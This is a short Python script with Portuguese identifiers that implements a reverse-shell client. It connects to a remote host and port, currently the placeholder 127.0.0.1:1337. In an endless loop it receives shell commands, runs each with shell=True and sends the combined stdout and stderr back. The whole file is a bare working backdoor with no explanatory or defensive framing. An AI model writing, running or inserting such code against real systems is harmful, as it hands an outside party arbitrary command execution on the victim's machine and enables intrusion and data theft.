import socket
import subprocess
HOST_REMOTO = "127.0.0.1"
PORTA_REMOTA = 1337
cliente = socket.socket()
print("[-] inicializando conexao...")
cliente.connect((HOST_REMOTO, PORTA_REMOTA))
print("[-] conexao iniciada!")

while True:
    print("esperando comando: ")
    comando = cliente.recv(1024)
    comando = comando.decode()
    operacao = subprocess.Popen(comando, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    saida = operacao.stdout.read()
    saida_errada = operacao.stderr.read()
    print("[-] mandando resposta")
    cliente.send(saida + saida_errada)
